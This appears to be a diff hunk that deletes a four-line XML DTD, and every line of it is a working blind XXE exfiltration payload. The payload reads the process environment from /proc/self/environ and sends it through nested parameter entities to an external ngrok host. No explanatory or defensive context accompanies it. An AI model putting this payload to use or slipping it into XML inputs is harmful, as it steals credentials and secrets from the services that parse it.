@@ -1,4 +1,0 @@
-<!ENTITY % data SYSTEM "file:///proc/self/environ">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://66424e442b1c.ngrok-free.app/?x=%data;'>">
-%eval;
-%exfiltrate;
